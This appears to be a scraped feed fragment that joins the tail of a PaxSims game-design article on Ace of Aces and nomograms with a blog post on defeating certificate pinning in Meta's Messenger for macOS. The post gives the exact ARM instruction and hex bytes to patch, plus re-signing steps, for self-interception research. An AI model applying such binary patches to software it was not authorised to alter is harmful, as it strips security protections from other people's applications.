<p>Next you need to convert the hex cell references (position and rotation) to the page numbers for the Allied player, and German player, using the first table as the look-up. That last bit using the reciprocal value for the German book is the thing that closes the loop on our transformation matrices, because remember we computed the whole table from the perspective of the Allied aircraft. Now with a reciprocal pair of tables, it <em>works</em> that you’re giving a page number to your enemy for <em>your</em> move, and they’re giving you a page number for <em>their</em> move. Honestly, the more I think about this, the more I’m blown away by Leonardi’s conception. It’s fiendishly clever.</p>



<p>The final step to make the books is to pair up the starting position page with the strip out of this matrix of possible intermediate pages. That’s where Leonardi had to put down the slide rule and start drawing pictures. 446 of them. But since I’m using Unity to move hex grids around to generate all these page numbers…why don’t I attach 3D objects to the grids and cameras and take a screenshot of each relative position while I’m working out its cell reference?</p>



<p>This is art: using a game engine to write a program to encode a program into paper computer. (I wonder if there’s a way to 3D print a game engine out of a paper computer…?)</p>



<p>Oh, and also: because I’ve automated this process, it takes…less than a second…to generate the pages of these books. And the same program can write the Excel spreadsheet that allows me to automate turning them into a hyperlinked pdf (it’s Turtles all the way down), which means I can easily generate more complicated grids than Ace of Aces. So I did.</p>



<p>Behold: Ace of U-boats:</p>



<figure><a href="https://paxsims.files.wordpress.com/2024/03/escort-163.png"><img data-attachment-id="36928" data-permalink="https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/escort-163/" data-orig-file="https://paxsims.files.wordpress.com/2024/03/escort-163.png" data-orig-size="1790,907" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="escort-163" data-image-description="" data-image-caption="" data-medium-file="https://paxsims.files.wordpress.com/2024/03/escort-163.png?w=300" data-large-file="https://paxsims.files.wordpress.com/2024/03/escort-163.png?w=630" loading="lazy" width="1024" height="518" src="https://paxsims.files.wordpress.com/2024/03/escort-163.png?w=1024" alt="The view from the deck of an Allied Corvette at night, with a surfaced U-boat on the starboard beam." srcset="https://paxsims.files.wordpress.com/2024/03/escort-163.png?w=1022 1022w, https://paxsims.files.wordpress.com/2024/03/escort-163.png?w=150 150w, https://paxsims.files.wordpress.com/2024/03/escort-163.png?w=300 300w, https://paxsims.files.wordpress.com/2024/03/escort-163.png?w=768 768w, https://paxsims.files.wordpress.com/2024/03/escort-163.png 1790w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Open fire with the deck guns!</figcaption></figure>



<ul>
<li>a 4-hex grid…</li>



<li>…with two layers for the U-boat—surfaced, or submerged</li>



<li>and (hold onto your hats) <a href="https://www.youtube.com/watch?v=kEB11PQ9Eo8">non-euclidean geometry</a>: I cheated the hex grid scale at the different ranges because close-up you need to be working at a roughly-one-ships’-length scale (70 yards), but I want to play out to asdic ranges (3,500 yards) without having a gaziilion grid cells in between. Because we’re in relative geometry space, this totally works; the reciprocal distances are always self-consistent.</li>
</ul>



<p>Also, I used <a href="https://www.youtube.com/watch?v=28JTTXqMvOU">minimap</a> tricks to create the asdic screen for the screenshot, which feels like adding one more layer of inception: using a games engine to program a computer game to encode a program in a paper computer. If I can get Midjourney to play the game for me, I’m pretty sure there’ll be a phone call for Professor Falken.</p>



<figure><a href="https://paxsims.files.wordpress.com/2024/03/escort-164.png"><img data-attachment-id="36930" data-permalink="https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/escort-164/" data-orig-file="https://paxsims.files.wordpress.com/2024/03/escort-164.png" data-orig-size="1790,907" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="escort-164" data-image-description="" data-image-caption="" data-medium-file="https://paxsims.files.wordpress.com/2024/03/escort-164.png?w=300" data-large-file="https://paxsims.files.wordpress.com/2024/03/escort-164.png?w=630" loading="lazy" width="1024" height="518" src="https://paxsims.files.wordpress.com/2024/03/escort-164.png?w=1024" alt="The view from the deck of an Allied Corvette at night, nothing visible on the surface but an Asdic response on the starboard bow." srcset="https://paxsims.files.wordpress.com/2024/03/escort-164.png?w=1022 1022w, https://paxsims.files.wordpress.com/2024/03/escort-164.png?w=150 150w, https://paxsims.files.wordpress.com/2024/03/escort-164.png?w=300 300w, https://paxsims.files.wordpress.com/2024/03/escort-164.png?w=768 768w, https://paxsims.files.wordpress.com/2024/03/escort-164.png 1790w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Contact! The Asdic always shows contacts relative to your ships’ orientation, but the look out view is looking in the direction of that contact. The indicator shows the relative bearing your looking towards, with 0deg being ahead of the ship (also, the stars are a fixed point of reference 😉)</figcaption></figure>



<h2>But how can I apply this to games that aren’t 2-player first-person shooters?</h2>



<p>A particularly rich vein of interesting maths for boardgames are <a href="https://en.wikipedia.org/wiki/Nomogram">nomograms</a>: the paper version of cam-based mechanical computing. They are a close-cousin of slide rules (nomograms with moving parts) like <em>the</em> <a href="https://en.wikipedia.org/wiki/Slide_rule">slide rule</a> for general maths, the <a href="https://en.wikipedia.org/wiki/Planimeter">planimeter</a> for integration (measuring the area under a graph), or for solving relative motion problems: the <a href="https://en.wikipedia.org/wiki/Maneuvering_board">manoeuvring board</a>, the <a href="https://en.wikipedia.org/wiki/Battenberg_course_indicator">Battenberg Course Indicator</a>, and the U-boat <a href="https://www.youtube.com/watch?v=EOSEItGE2qI">Attack Disc</a>.</p>



<p>They’re basically just a multi-dimensional look-up table—one that’s much easier to use than cross-referencing a bunch of look up tables (I’m looking at you, weapon vs armour class vs range charts!) Here’s a nice example from the Conduct of Anti-U-Boat operations in WW2:</p>



<figure><a href="https://paxsims.files.wordpress.com/2024/03/2021-06-09-11.36.54.jpg"><img data-attachment-id="36932" data-permalink="https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/2021-06-09-11-36-54/" data-orig-file="https://paxsims.files.wordpress.com/2024/03/2021-06-09-11.36.54.jpg" data-orig-size="4032,3024" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;2.2&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone SE (1st generation)&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1623238614&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.15&quot;,&quot;iso&quot;:&quot;50&quot;,&quot;shutter_speed&quot;:&quot;0.03030303030303&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="2021-06-09-11.36.54" data-image-description="" data-image-caption="" data-medium-file="https://paxsims.files.wordpress.com/2024/03/2021-06-09-11.36.54.jpg?w=300" data-large-file="https://paxsims.files.wordpress.com/2024/03/2021-06-09-11.36.54.jpg?w=630" loading="lazy" width="1024" height="768" src="https://paxsims.files.wordpress.com/2024/03/2021-06-09-11.36.54.jpg?w=1024" alt="Photo of a WW2 nomogram, titled &quot;Search for submarine reported at a distance&quot; and two graphs labelled approach diagram and sweeping diagram." srcset="https://paxsims.files.wordpress.com/2024/03/2021-06-09-11.36.54.jpg?w=1024 1024w, https://paxsims.files.wordpress.com/2024/03/2021-06-09-11.36.54.jpg?w=2048 2048w, https://paxsims.files.wordpress.com/2024/03/2021-06-09-11.36.54.jpg?w=150 150w, https://paxsims.files.wordpress.com/2024/03/2021-06-09-11.36.54.jpg?w=300 300w, https://paxsims.files.wordpress.com/2024/03/2021-06-09-11.36.54.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Suppose you are in command of an escort, and you get a report of a U-boat sighting. You want to steam over and then find the U-boat, obviously…but by the time you get there, the U-boat will have moved. The longer it takes you to arrive at its last-known location, the bigger the area you’ll need to search to find it. How big an area ? Well, that depends on how far away you are, how fast you travel, how long you wait before starting out…</figcaption></figure>




			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Cracking Meta's Messenger Certificate Pinning on macOS (449 pts)]]></title>
            <link>https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/</link>
            <guid>39609336</guid>
            <pubDate>Tue, 05 Mar 2024 21:25:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/">https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/</a>, See on <a href="https://news.ycombinator.com/item?id=39609336">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>With Meta’s Messenger application for macOS being so close to the Texts.com model—that being a standalone desktop application—<a href="https://bt.hn/">Batuhan İçöz</a> who is leading the Meta platform project at Texts.com thought we could gain some valuable insight by analyzing it. Everyone knows that intercepting network requests is a great and low barrier-of-entry first-step.</p>



<p>Meta implements certificate pinning into their applications which enhances their security model, and prevents us from being able to execute a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">MITM (man-in-the-middle) attack</a> on ourselves to analyze the requests made to their servers.</p>



<h2>What is Certificate Pinning?</h2>



<p>When you set up a proxy client capable of intercepting your requests, you’re forced to configure and trust a “certificate authority,” one which you created. Certificates issued by your certificate authority will be used and will be able to intercept and decrypt information pertaining to the requests.</p>



<p>If a service implements certificate pinning, they’ve effectively opted to accept certificates issued only by specific certificate authorities, preventing certificates issued by your certificate authority from being used.</p>



<p>With certificate pinning enabled, our self-signed certificate is invalid, and thus our requests cannot be intercepted.</p>



<h2>Default Behaviour</h2>



<p>Without disabling certificate pinning, all requests return an “Internal Error” and our proxy software indicates that the “SSL Handshake Failed” with the request not completing its lifecycle. We thus can infer no information about the request.</p>







<figure><img fetchpriority="high" decoding="async" width="800" height="674" data-attachment-id="174" data-permalink="https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/cleanshot-2024-02-19-at-18-25-09/" data-orig-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.25.09.gif?fit=800%2C674&amp;ssl=1" data-orig-size="800,674" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cleanshot-2024-02-19-at-18.25.09" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.25.09.gif?fit=300%2C253&amp;ssl=1" data-large-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.25.09.gif?fit=800%2C674&amp;ssl=1" src="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.25.09.gif?resize=800%2C674&amp;ssl=1" alt="" data-recalc-dims="1"></figure>



<h2>Desired Behaviour</h2>



<p>We want to be able to successfully make requests and read the request, response and headers from our network debugging tool by using a MITM attack on ourselves.</p>



<h2>Potential Approaches</h2>



<p>One option I’ve found to work in the past would be to alter the URL strings in the binary to insecure self-hosted endpoints that don’t implement TLS. It would forward requests and responses between the end-client and end-server. This works best for smaller applications, unlike Messenger.</p>



<p>We could use a dynamic instrumentation library, such as Frida to achieve the desired outcome. I’ve found that Messenger in particular is prone to crashes when hooking into it and with all this overhead, it can be difficult to pinpoint the pain-point. There’s also the more complicated distribution process involved with Frida. Those who wanted to run it would need to configure a very specific environment and set of tools.</p>



<p>Despite this, I did attempt to use a Frida script that I’ve been maintaining over the past few years that works to bypass common certificate pinning libraries and methods. It works on the vast majority of applications. Unfortunately, Meta’s subset of applications is not part of this “vast majority.”</p>



<p>In this case, we’ll be looking to turn off certificate pinning entirely in a way which can be easily distributed to my fellow team members using binary patching.</p>



<h2>The Approach</h2>



<p>After downloading Messenger and moving it into my applications folder, I grabbed the compiled ARM binary from <code>/Applications/Messenger.app/Content/MacOS/Messenger</code> and imported it into Hopper.</p>







<figure><img decoding="async" width="1024" height="379" data-attachment-id="176" data-permalink="https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/cleanshot-2024-02-19-at-18-37-33/" data-orig-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.37.33.png?fit=1178%2C436&amp;ssl=1" data-orig-size="1178,436" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cleanshot-2024-02-19-at-18.37.33" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.37.33.png?fit=300%2C111&amp;ssl=1" data-large-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.37.33.png?fit=1024%2C379&amp;ssl=1" src="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.37.33.png?resize=1024%2C379&amp;ssl=1" alt="" srcset="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.37.33.png?resize=1024%2C379&amp;ssl=1 1024w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.37.33.png?resize=300%2C111&amp;ssl=1 300w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.37.33.png?resize=768%2C284&amp;ssl=1 768w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.37.33.png?w=1178&amp;ssl=1 1178w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure>



<p>Hopper allows us to disassemble, decompile, recompile, debug, and visualize compiled binaries. </p>







<figure><img decoding="async" width="1024" height="508" data-attachment-id="177" data-permalink="https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/cleanshot-2024-02-19-at-18-41-38/" data-orig-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.41.38.png?fit=1897%2C941&amp;ssl=1" data-orig-size="1897,941" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cleanshot-2024-02-19-at-18.41.38" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.41.38.png?fit=300%2C149&amp;ssl=1" data-large-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.41.38.png?fit=1024%2C508&amp;ssl=1" src="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.41.38.png?resize=1024%2C508&amp;ssl=1" alt="" srcset="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.41.38.png?resize=1024%2C508&amp;ssl=1 1024w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.41.38.png?resize=300%2C149&amp;ssl=1 300w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.41.38.png?resize=768%2C381&amp;ssl=1 768w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.41.38.png?resize=1536%2C762&amp;ssl=1 1536w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.41.38.png?resize=1200%2C595&amp;ssl=1 1200w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/cleanshot-2024-02-19-at-18.41.38.png?w=1897&amp;ssl=1 1897w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure>



<p>Once the binary was loaded and references had loaded, I started by searching for certificate pinning related terminology such as “certificate,” “ssl,” “pinning,” etc.</p>



<p><code>"SSL pinning verification failed for host:"</code> certainly felt like a great place to start.</p>



<p>Ideally we’ll modify as little as possible. When it comes to compiled binaries, modifications can easily result in gnarly crashes if we overextend ourselves. The best case scenario would be flipping a boolean value, reversing a conditional, etc., ideally modifying a single or few instructions.</p>







<figure><img loading="lazy" decoding="async" width="800" height="396" data-attachment-id="189" data-permalink="https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/cleanshot-2024-02-19-at-18-47-13-2/" data-orig-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.47.13.gif?fit=800%2C396&amp;ssl=1" data-orig-size="800,396" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CleanShot-2024-02-19-at-18.47.13" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.47.13.gif?fit=300%2C149&amp;ssl=1" data-large-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.47.13.gif?fit=800%2C396&amp;ssl=1" src="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.47.13.gif?resize=800%2C396&amp;ssl=1" alt="" data-recalc-dims="1"></figure>



<p>I switched to the control flow graph, allowing me to visualize the execution flow and walked myself up a series of linked references. Eventually, I found a string which said&nbsp;<code>"Using custom sandbox -&gt; turn off SSL verification"</code>. I liked it. I scanned the file for references to the function that determines this flag and found it in the top of the procedure.</p>







<figure><img loading="lazy" decoding="async" width="1024" height="455" data-attachment-id="190" data-permalink="https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/cleanshot-2024-02-19-at-18-56-12-2/" data-orig-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.56.12.png?fit=2497%2C1109&amp;ssl=1" data-orig-size="2497,1109" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CleanShot-2024-02-19-at-18.56.12" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.56.12.png?fit=300%2C133&amp;ssl=1" data-large-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.56.12.png?fit=1024%2C455&amp;ssl=1" src="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.56.12.png?resize=1024%2C455&amp;ssl=1" alt="" srcset="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.56.12.png?resize=1024%2C455&amp;ssl=1 1024w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.56.12.png?resize=300%2C133&amp;ssl=1 300w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.56.12.png?resize=768%2C341&amp;ssl=1 768w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.56.12.png?resize=1536%2C682&amp;ssl=1 1536w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.56.12.png?resize=2048%2C910&amp;ssl=1 2048w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.56.12.png?resize=1200%2C533&amp;ssl=1 1200w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure>



<p>Looking at the function <code>IsUsingSandbox()</code>, we can see exactly where the returned value is being assigned. In the following screenshot, the&nbsp;<code>w0</code>&nbsp;register is being moved from&nbsp;<code>w19</code>&nbsp;and then returned.&nbsp;<code>w19</code>&nbsp;is assigned through a load byte instruction.</p>







<figure><img loading="lazy" decoding="async" width="1024" height="455" data-attachment-id="191" data-permalink="https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/cleanshot-2024-02-19-at-18-59-42-2/" data-orig-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.59.42.png?fit=2497%2C1109&amp;ssl=1" data-orig-size="2497,1109" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CleanShot-2024-02-19-at-18.59.42" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.59.42.png?fit=300%2C133&amp;ssl=1" data-large-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.59.42.png?fit=1024%2C455&amp;ssl=1" src="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.59.42.png?resize=1024%2C455&amp;ssl=1" alt="" srcset="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.59.42.png?resize=1024%2C455&amp;ssl=1 1024w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.59.42.png?resize=300%2C133&amp;ssl=1 300w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.59.42.png?resize=768%2C341&amp;ssl=1 768w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.59.42.png?resize=1536%2C682&amp;ssl=1 1536w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.59.42.png?resize=2048%2C910&amp;ssl=1 2048w, https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-18.59.42.png?resize=1200%2C533&amp;ssl=1 1200w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure>



<p>Instead of assigning&nbsp;<code>w19</code>&nbsp;through a load byte instruction, we’re going to just set it to true no matter what. This will effectively force&nbsp;<code>IsUsingSandbox</code> to be&nbsp;true, which judging from that string from earlier, means certificate pinning will be disabled.</p>



<h3>Original</h3>


<div><pre title="">ARM: ldrb w19, [sp, #0x40 + var_20]
HEX: F3 83 40 39
</pre></div>


<h3>Rewritten</h3>


<div><pre title="">ARM: mov w19, #1
HEX: 33 00 80 52
</pre></div>


<p>We can do this replacement with the hexadecimal mode, which allows us to directly modify the byte code in the application.</p>







<figure><img loading="lazy" decoding="async" width="800" height="356" data-attachment-id="192" data-permalink="https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/cleanshot-2024-02-19-at-19-05-06-2/" data-orig-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-19.05.06.gif?fit=800%2C356&amp;ssl=1" data-orig-size="800,356" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CleanShot-2024-02-19-at-19.05.06" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-19.05.06.gif?fit=300%2C134&amp;ssl=1" data-large-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-19.05.06.gif?fit=800%2C356&amp;ssl=1" src="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-19.05.06.gif?resize=800%2C356&amp;ssl=1" alt="" data-recalc-dims="1"></figure>



<h2>Result</h2>



<p>After this, we can export our new executable using the “Produce New Executable” option under “File,” remove the signature from the executable, and we’re off to the races. We’ll replace the original Messenger binary with this new binary we’ve produced.</p>



<p>After relaunching Messenger, we can see that headers, response body, and all other request information is visible in our proxy tool. By modifying just 4 of the binary’s 97,477,728 bytes we can now intercept requests!</p>







<figure><img loading="lazy" decoding="async" width="800" height="672" data-attachment-id="193" data-permalink="https://texts.blog/2024/02/20/cracking-metas-messenger-certificate-pinning-on-macos/cleanshot-2024-02-19-at-19-08-25-2/" data-orig-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-19.08.25.gif?fit=800%2C672&amp;ssl=1" data-orig-size="800,672" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CleanShot-2024-02-19-at-19.08.25" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-19.08.25.gif?fit=300%2C252&amp;ssl=1" data-large-file="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-19.08.25.gif?fit=800%2C672&amp;ssl=1" src="https://i0.wp.com/texts.blog/wp-content/uploads/2024/02/CleanShot-2024-02-19-at-19.08.25.gif?resize=800%2C672&amp;ssl=1" alt="" data-recalc-dims="1"></figure>



<h2>Distribution</h2>



<p>After compiling the binary, I sent it over to Batuhan to use. Once he had the binary in-hand he obtained and installed a signing certificate and proceeded to sign the application. Once that was done, he was able to utilize the binary on his system and view his own requests.</p>



<pre><code>codesign --force --deep -s CERTNAME_OR_ID /Applications/Messenger.app</code></pre>



<hr>



<p>Want to see a similar approach for iOS? <a href="https://www.cyclon3.com/bypass-instagram-ssl-certificate-pinning-for-ios" data-type="link" data-id="https://www.cyclon3.com/bypass-instagram-ssl-certificate-pinning-for-ios">Read this 2020 post</a> by <a href="https://twitter.com/_Cyclon3" data-type="link" data-id="https://twitter.com/_Cyclon3">Hassan Mostafa</a> where he flipped a conditional branching instruction to crack certificate pinning on Instagram on a jailbroken iPhone.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Array languages vs. the curse of the spreadsheet (124 pts)]]></title>
            <link>https://blog.dhsdevelopments.com/array-languages-vs</link>
            <guid>39608822</guid>
            <pubDate>Tue, 05 Mar 2024 20:32:44 GMT</pubDate>
